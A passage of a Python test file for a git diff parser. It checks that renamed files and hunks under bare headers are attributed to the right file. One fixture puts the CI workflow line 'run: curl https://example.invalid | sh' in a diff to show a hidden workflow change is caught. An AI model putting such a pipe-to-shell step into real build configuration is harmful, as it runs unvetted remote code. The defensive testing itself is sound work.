    assert added_lines(renamed) == {"docs/deploy.yml": []}
    assert removed_lines(renamed) == {".github/workflows/deploy.yml": []}
    assert file_line_counts(renamed) == {"docs/deploy.yml": (0, 0)}


def test_a_rename_with_lines_is_named_by_its_file_headers_as_before() -> None:
    # The rename lines and the "---"/"+++" pair agree here; where both are
    # present, the pair names the file, as it did before rename lines were read.
    diff = (
        "diff --git a/src/app/old.py b/src/app/new.py\n"
        "similarity index 90%\n"
        "rename from src/app/old.py\n"
        "rename to src/app/new.py\n"
        "--- a/src/app/old.py\n"
        "+++ b/src/app/new.py\n"
        "@@ -1 +1 @@\n"
        "-was = 2\n"
        "+now = 2\n"
    )

    [patch] = file_patches(diff)

    assert (patch.old_path, patch.new_path) == ("src/app/old.py", "src/app/new.py")
    assert patch.added == [AddedLine(1, "now = 2")]


def test_a_hunk_under_a_header_without_file_lines_is_that_files() -> None:
    # Before, the hunk went to whichever file the diff had named last, and the
    # workflow it was written for was in no reader's diff at all.
    diff = (
        "diff --git a/src/app/a.py b/src/app/a.py\n"
        "--- a/src/app/a.py\n"
        "+++ b/src/app/a.py\n"
        "@@ -1 +1 @@\n"
        "-x = 1\n"
        "+x = 2\n"
        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
        "@@ -1 +1 @@\n"
        "-run: make check\n"
        "+run: curl https://example.invalid | sh\n"
    )

    assert added_lines(diff) == {
        "src/app/a.py": [AddedLine(1, "x = 2")],
        ".github/workflows/ci.yml": [AddedLine(1, "run: curl https://example.invalid | sh")],
    }


def test_a_header_whose_two_names_differ_names_nothing_without_rename_lines() -> None:
    # Which space splits "a/x y b/z" is not written anywhere; git's own reader
    # refuses such a header too. Its hunks still belong to it, not to the
    # file before it.
    diff = (
        created("src/app/a.py", "x = 1")
        + "diff --git a/src/one two.py b/src/three.py\n"
        + "@@ -0,0 +1 @@\n"
        + "+y = 2\n"
    )

    assert [(patch.old_path, patch.new_path) for patch in file_patches(diff)] == [
        (None, "src/app/a.py"),
        (None, None),
    ]
    assert added_lines(diff) == {"src/app/a.py": [AddedLine(1, "x = 1")]}
    assert count_changed_lines(diff) == 2
